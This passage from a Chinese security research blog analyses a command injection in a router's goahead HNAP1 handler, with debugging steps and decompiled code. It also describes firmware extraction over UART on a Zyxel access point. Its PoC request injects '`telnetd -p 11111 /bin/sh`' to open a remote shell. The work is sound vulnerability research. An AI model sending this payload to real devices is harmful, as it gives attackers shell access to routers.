清空/var/udhcpc/br0.deconfig文件内容<br>cp /bin/init.sh /var/udhcpc/wlan0.deconfig // 复制/bin/init.sh到/var/udhcpc/wlan0.deconfig<br>echo &quot; &quot; &gt; /var/udhcpc/wlan0.deconfig // 清空/var/udhcpc/wlan0.deconfig文件内容<br><br>if [ &quot;$CINIT&quot; = 1 ]; then<br>startup.sh // 如果CINIT等于1，则执行startup.sh脚本<br>fi<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-keyword">for</span> wapi certs related</span><br>mkdir /var/myca // 创建/var/myca目录<br><span class="hljs-meta prompt_"># </span><span class="language-bash">wapi cert(must <span class="hljs-keyword">done</span> before init.sh)</span><br>cp -rf /usr/local/ssl/* /var/myca/ 2&gt;/dev/null // 复制/usr/local/ssl/*到/var/myca<br><span class="hljs-meta prompt_"># </span><span class="language-bash">loadWapiFiles &gt;/dev/null 2&gt;&amp;1</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-keyword">for</span> wireless client mode 802.1x</span><br>mkdir /var/1x // 创建/var/1x目录<br>cp -rf /usr/1x/* /var/1x/ 2&gt;/dev/null // 复制/usr/1x/*到/var/1x<br>mkdir /var/openvpn // 创建/var/openvpn目录<br>cp -rf /usr/share/openvpn/* /var/openvpn 2&gt;/dev/null // 复制/usr/share/openvpn/*到/var/openvpn<br><span class="hljs-meta prompt_">#</span><span class="language-bash">---------------------------------------------------------------------------</span><br>SHARE_WIFI_DISABLE=`flash get WLAN1_VAP3_WLAN_DISABLED` // 从flash获取WLAN1_VAP3_WLAN_DISABLED的值<br>if [ &quot;$SHARE_WIFI_DISABLE&quot; = &quot;WLAN1_VAP3_WLAN_DISABLED=0&quot; ];then<br>flash set WLAN1_VAP3_WLAN_DISABLED 1 // 如果WLAN1_VAP3_WLAN_DISABLED等于0，则设置其为1<br>fi<br><span class="hljs-meta prompt_">#</span><span class="language-bash">---------------------------------------------------------------------------</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Start system script</span><br>init.sh gw all // 执行init.sh脚本，传递参数gw all<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">modify dst-cache setting</span><br>echo &quot;24576&quot; &gt; /proc/sys/net/ipv4/route/max_size // 设置最大路由缓存大小为24576<br>echo &quot;180&quot; &gt; /proc/sys/net/ipv4/route/gc_thresh // 设置路由垃圾回收阈值为180<br>echo 20 &gt; /proc/sys/net/ipv4/route/gc_elasticity // 设置路由垃圾回收弹性为20<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> 35 &gt; /proc/sys/net/ipv4/route/gc_interval</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> 60 &gt; /proc/sys/net/ipv4/route/secret_interval</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> 10 &gt; /proc/sys/net/ipv4/route/gc_timeout</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;4096&quot;</span> &gt; /proc/sys/net/nf_conntrack_max</span><br>echo &quot;12288&quot; &gt; /proc/sys/net/netfilter/nf_conntrack_max // 设置网络连接跟踪表的最大大小为12288<br>echo &quot;600&quot; &gt; /proc/sys/net/ipv4/netfilter/ip_conntrack_tcp_timeout_established // 设置TCP连接跟踪表的超时时间为600秒<br>echo &quot;20&quot; &gt; /proc/sys/net/ipv4/netfilter/ip_conntrack_tcp_timeout_time_wait // 设置TCP等待时间的超时时间为20秒<br>echo &quot;20&quot; &gt; /proc/sys/net/ipv4/netfilter/ip_conntrack_tcp_timeout_close // 设置TCP关闭状态的超时时间为20秒<br>echo &quot;90&quot; &gt; /proc/sys/net/ipv4/netfilter/ip_conntrack_udp_timeout // 设置UDP连接跟踪表的超时时间为90秒<br>echo &quot;120&quot; &gt; /proc/sys/net/ipv4/netfilter/ip_conntrack_udp_timeout_stream // 设置UDP流的超时时间为120秒<br>echo &quot;90&quot; &gt; /proc/sys/net/ipv4/netfilter/ip_conntrack_generic_timeout // 设置通用连接跟踪表的超时时间为90秒<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1048576&quot;</span> &gt; /proc/sys/net/ipv4/rt_cache_rebuild_count</span><br>echo &quot;32&quot; &gt; /proc/sys/net/netfilter/nf_conntrack_expect_max // 设置期望的最大连接跟踪表大小为32<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">modify IRQ Affinity setting</span><br>echo &quot;3&quot; &gt; /proc/irq/33/smp_affinity // 设置IRQ 33的SMP亲和性为3<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward <span class="hljs-comment">#don&#x27;t enable ip_forward before set MASQUERADE</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">echo</span> 2048 &gt; /proc/sys/net/core/hot_list_length</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">start web server</span><br>ls /bin/watchdog &gt; /dev/null &amp;&amp; watchdog 1000&amp; // 检查/bin/watchdog是否存在，如果存在则启动watchdog<br><span class="hljs-meta prompt_">#</span><span class="language-bash">boa</span><br><br>goahead &amp; // 启动goahead web服务器<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Turn off the power led of orange</span><br>echo &quot;29&quot; &gt; /sys/class/gpio/export // 导出GPIO 29<br>echo &quot;out&quot; &gt; /sys/class/gpio/gpio29/direction // 设置GPIO 29为输出方向<br>echo &quot;1&quot; &gt; /sys/class/gpio/gpio29/value // 设置GPIO 29的值为1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Turn on the power led of green</span><br>echo &quot;30&quot; &gt; /sys/class/gpio/export // 导出GPIO 30<br>echo &quot;out&quot; &gt; /sys/class/gpio/gpio30/direction // 设置GPIO 30为输出方向<br>echo &quot;0&quot; &gt; /sys/class/gpio/gpio30/value // 设置GPIO 30的值为0<br><br>cp /etc/passwd_orig /var/passwd // 复制/etc/passwd_orig到/var/passwd<br>cp /etc/group_orig /var/group // 复制/etc/group_orig到/var/group<br>MODE=`flash get HW_FACTORY_MODE` // 从flash获取HW_FACTORY_MODE的值<br>if [ &quot;$MODE&quot; = &quot;HW_FACTORY_MODE=1&quot; ];then<br>telnetd&amp; // 如果HW_FACTORY_MODE等于1，则启动telnetd<br>fi<br><span class="hljs-meta prompt_">#</span><span class="language-bash">telnetd&amp;</span><br>ifconfig wlan1-va3 down // 关闭wlan1-va3网络接口<br>speedcheck&amp; // 启动speedcheck脚本<br><span class="hljs-meta prompt_">#</span><span class="language-bash">wiair_client&amp;</span><br></code></pre></td></tr></table></figure><h3 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h3><p>FirmAE模拟</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803210555510.png" alt="image-20240803210555510"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>已知这里有一个命令执行</p><p>burp抓包分析</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803205522223.png" alt="image-20240803205522223"></p><p>访问任意一个页面时都会有很多提交到&#x2F;HNAP1的数据包</p><p>例如</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/HNAP1/</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Ubuntu; Linux x86_64; rv:<span class="hljs-number">109</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">113</span>.<span class="hljs-number">0</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>: */*</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Type: text/xml; charset=utf-<span class="hljs-number">8</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">SOAPAction</span>: <span class="hljs-string">&quot;http://purenetworks.com/HNAP1/GetGuestNetworkSettings&quot;</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">HNAP_AUTH</span>: <span class="hljs-number">006</span>FA439BC663762183CE374D1714F35 <span class="hljs-number">1722689296</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">X</span>-Requested-With: XMLHttpRequest</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">312</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Connection</span>: close</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">192.168.0.1</span>/Network.html</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Cookie</span>: uid=ujcI4DPmyw; PrivateKey=<span class="hljs-number">3</span>CC07A3F1F2C3719793D6EDA22C272E9; timeout=<span class="hljs-number">0</span></span><br><span class="language-apache"></span><br><span class="language-apache"></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-section">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><span class="hljs-section">&lt;soap:Envelope xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xmlns:xsd=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> xmlns:soap=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="hljs-section">&lt;soap:Body&gt;</span><span class="hljs-section">&lt;GetGuestNetworkSettings xmlns=<span class="hljs-string">&quot;http://purenetworks.com/HNAP1/&quot;</span> /&gt;</span><span class="hljs-section">&lt;/soap:Body&gt;</span><span class="hljs-section">&lt;/soap:Envelope&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.0</span> <span class="hljs-number">200</span> Data follows<br><br><span class="language-xml">Server: GoAhead-Webs</span><br><span class="language-xml"></span><br><span class="language-xml">Date: Sat Oct 31 18:33:08 2020</span><br><span class="language-xml"></span><br><span class="language-xml">Pragma: no-cache</span><br><span class="language-xml"></span><br><span class="language-xml">Cache-Control: no-cache</span><br><span class="language-xml"></span><br><span class="language-xml">Content-Type: text/html</span><br><span class="language-xml"></span><br><span class="language-xml">Location: </span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsd</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">GetGuestNetworkSettingsResponse</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://purenetworks.com/HNAP1/&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">GetGuestNetworkSettingsResult</span>&gt;</span>OK<span class="hljs-tag">&lt;/<span class="hljs-name">GetGuestNetworkSettingsResult</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">IPAddress</span>&gt;</span>192.168.100.1<span class="hljs-tag">&lt;/<span class="hljs-name">IPAddress</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">SubnetMask</span>&gt;</span>255.255.255.0<span class="hljs-tag">&lt;/<span class="hljs-name">SubnetMask</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">GetGuestNetworkSettingsResponse</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>soap协议</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">SOAP（Simple Object Access Protocol）是一种基于 <span class="hljs-keyword">XML</span> <span class="hljs-title">的通信协议，用于在网络上交换结构化的和标准化的信息。 它通常用于分布式系统中的应用程序之间进行通信。</span><br><span class="hljs-title"></span><br><span class="hljs-title">主要特点和用途：</span><br><span class="hljs-title">基于 XML</span>： SOAP 消息以 <span class="hljs-keyword">XML</span> <span class="hljs-title">格式编码，使其能够被广泛支持和理解。</span><br><span class="hljs-title"></span><br><span class="hljs-title">协议中立： 可以在多种传输协议上使用，如 HTTP</span>、SMTP、FTP 等，使得其具有很高的灵活性。<br><br>消息格式严格： SOAP 定义了严格的消息结构，包括头部和主体，使通信的结构清晰且可扩展。<br><br>跨平台和跨语言： SOAP 允许不同平台上的应用程序使用不同语言编写，通过标准化的 <span class="hljs-keyword">XML</span> <span class="hljs-title">格式进行通信。</span><br><span class="hljs-title"></span><br><span class="hljs-title">主要应用场景： SOAP</span> 最常见的用途是在 Web 服务中，例如用于不同系统之间的数据交换、远程调用（RPC）等。 它通过定义严格的消息格式和协议细节，确保了不同系统之间的互操作性和通信可靠性。<br><br>SOAP 的结构：<br>SOAP 消息通常由以下部分组成：<br><br>Envelope（信封）： 定义了消息的开始和结束，以及包含了必要的命名空间声明。<br><br>Header（头部）： 可选的部分，包含了关于消息的非业务性信息，比如身份验证、事务处理等。<br><br>Body（主体）： 包含了实际的消息内容，通常是请求或响应的具体数据。<br></code></pre></td></tr></table></figure><p>hnap协议</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HNAP1</span>（Home Network Administration Protocol <span class="hljs-number">1</span>）是一个用于管理家庭网络设备的协议。它通常与路由器、交换机等网络设备相关联，旨在提供一种标准化的方法，使用户能够远程管理和配置其家庭网络设备。<br></code></pre></td></tr></table></figure><p>所以这里是获取了路由器的GuestNetworkSettings</p><p>关键在于请求包中的SOAPAction: “<a href="http://purenetworks.com/HNAP1/GetGuestNetworkSettings">http://purenetworks.com/HNAP1/GetGuestNetworkSettings</a>“</p><p>在 SOAP 协议中，服务端通过解析 HTTP 请求头中的 SOAPAction 来确定客户端希望调用的具体操作。这种机制有助于确保在多个可能存在的操作中，正确地识别并处理客户端请求。</p><p>因此， 表示客户端希望执行的是一个名为 GetGuestNetworkSettings 的操作。</p><p>ida打开goahead二进制文件</p><p>搜索字符串HNAP定位到sub_423F90()函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803214527009.png" alt="image-20240803214527009"></p><p>进入sub_42383C（）函数</p><p>查看该函数调用链</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240805102525280.png" alt="image-20240805102525280"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803214834875.png" alt="image-20240803214834875"></p><p>就是这里导致了命令执行</p><p>poc</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/HNAP1/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.0.1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml; charset=utf-8<br><span class="hljs-attribute">SOAPAction</span><span class="hljs-punctuation">: </span>&quot;http://purenetworks.com/HNAP1/GetWLanRadioSettings&quot;<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>28<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.0.1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-1c">&#x27;`telnetd -p <span class="hljs-number">1111</span>1 /bin/sh`&#x27;</span><br></code></pre></td></tr></table></figure><p>接下来动调</p><p>gdb</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">gdb-multiarch ./bin/goahead -<span class="hljs-variable language_">x</span> <span class="hljs-variable language_">script</span><br></code></pre></td></tr></table></figure><p>script脚本</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> arch <span class="hljs-comment">mips</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">endian little</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">sysroot lib</span>/<br>set solib-search-path lib/<br>target <span class="hljs-comment">remote 192.168.0.1:1337</span><br></code></pre></td></tr></table></figure><p>下断点到函数sub_42383，看参数是如何被传入的</p><p>sub_423f90无法下断点，会报错</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b</span> *<span class="hljs-number">0</span>x0042383C<br></code></pre></td></tr></table></figure><p>下断点下到这里</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240804004942502.png" alt="image-20240804004942502"></p><p>请求包已经被拆解</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240804004909920.png" alt="image-20240804004909920"></p><p>看一下栈上的信息</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240804005342709.png" alt="image-20240804005342709"></p><p>开始处理返回包了</p><p>继续执行发现无论如何调试都会执行到原来的地方</p><p>猜测是进入了for循环</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> ( dword_58A6C4 = (<span class="hljs-type">int</span>)&amp;off_588D80; *(_DWORD *)dword_58A6C4; dword_58A6C4 += <span class="hljs-number">8</span> )<br>&#123;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strstr</span>(*(_DWORD *)(a1 + <span class="hljs-number">1316</span>), *(_DWORD *)dword_58A6C4) )<br>  &#123;<br>    <span class="hljs-comment">// 如果在 a1 + 1316 处的字符串中找到 *(_DWORD *)dword_58A6C4 指向的子字符串</span><br><br>    <span class="hljs-comment">// 执行一些操作，包括记录日志和条件判断</span><br>    <span class="hljs-built_in">memset</span>(v17, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(v17));<br>    <span class="hljs-built_in">snprintf</span>(v17, <span class="hljs-number">4999</span>, <span class="hljs-string">&quot;echo &#x27;%s&#x27; &gt;/var/hnaplog&quot;</span>, a11);<br>    <span class="hljs-built_in">system</span>(v17);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wp-&gt;hnapfunc===========&gt;%s\n&quot;</span>, *(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(a1 + <span class="hljs-number">1316</span>));<br><br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(*(_DWORD *)dword_58A6C4, <span class="hljs-string">&quot;GetLocalMac&quot;</span>, <span class="hljs-number">11</span>) )<br>    &#123;<br>      <span class="hljs-comment">// 如果 *(_DWORD *)dword_58A6C4 指向的字符串与 &quot;GetLocalMac&quot; 前 11 个字符匹配</span><br>      <span class="hljs-built_in">memset</span>(&amp;unk_58A6A0, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br>      <span class="hljs-built_in">strncpy</span>(&amp;unk_58A6A0, a1 + <span class="hljs-number">48</span>, <span class="hljs-number">32</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ( (*(<span class="hljs-built_in">int</span> (__fastcall **)(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(dword_58A6C4 + <span class="hljs-number">4</span>))(a11) )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个for循环是用来遍历参数的</p><p>直接打断点下到if判断里面</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240804005447427.png" alt="image-20240804005447427"></p><p>payload由栈上存入寄存器</p><p>进入sprintf开始拼接系统命令</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803235729615.png" alt="image-20240803235729615"></p><p>拼接完成后执行system</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240904144238898.png" alt="image-20240904144238898"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>合勤NWA1100固件提取</title>
    <link href="/2024/07/04/%E5%90%88%E5%8B%A4NWA1100%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/"/>
    <url>/2024/07/04/%E5%90%88%E5%8B%A4NWA1100%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h2 id="合勤NWA1100固件提取"><a href="#合勤NWA1100固件提取" class="headerlink" title="合勤NWA1100固件提取"></a>合勤NWA1100固件提取</h2><p>uart 调试 不一样的方法</p><p>​        当连接设备的串口调试时，通常我们是选择利用uboot或者编程器来提取固件，但由于uboot命令被阉割和编程器设备的限制，我们也可以选择用web服务的80端口来提取固件。</p><p>今天记录一下合勤NWA1100固件的提取。</p><p>首先连接串口，GND对GND，TX对RX，RX对TX，打开secureCRT进行uart调试</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240907181743924.png" alt="image-20240907181743924"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240907181757043.png" alt="image-20240907181757043"></p><p>ps查看进程，<code>717 root       1372 S   /sbin/webs 80</code>,可以看到web服务由二进制文件&#x2F;sbin&#x2F;webs启动</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240907181805316.png" alt="image-20240907181805316"></p><p>web目录在&#x2F;var&#x2F;webpages目录下</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240814114133789.png" alt="image-20240814114133789"></p><p>看一下busybox里面的命令</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240814114828455.png" alt="image-20240814114828455"></p><p>我们尝试把web目录用tar命令打包</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240814115306827.png" alt="image-20240814115306827"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240814115604331.png" alt="image-20240814115604331"></p><p>压缩过程中提示设备空间已满，看了一下设备内存一共只有8M，把&#x2F;tmp目录清空，并删除了几个没有用的二进制文件，重新将webpage打包。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240814120230695.png" alt="image-20240814120230695"></p><p>将webpage.tar 放到webpage&#x2F;images目录</p><p>打开浏览器，访问<a href="http://192.168.1.2/images/webpage.tar">http://192.168.1.2/images/webpage.tar</a> </p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240814120443582.png" alt="image-20240814120443582"></p><p>tar文件解压后查看，得到web目录</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240814120520637.png" alt="image-20240814120520637"></p><p>同样的方法，我们可以打包webs服务二进制文件，再通过webpage目录传输</p><p>ps：由于webs正在运行，所以可以把它先拷贝出来，然后再打包，需要什么文件，就打包什么。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DI-8100固件分析</title>
    <link href="/2024/06/04/DI-8100%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <url>/2024/06/04/DI-8100%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    
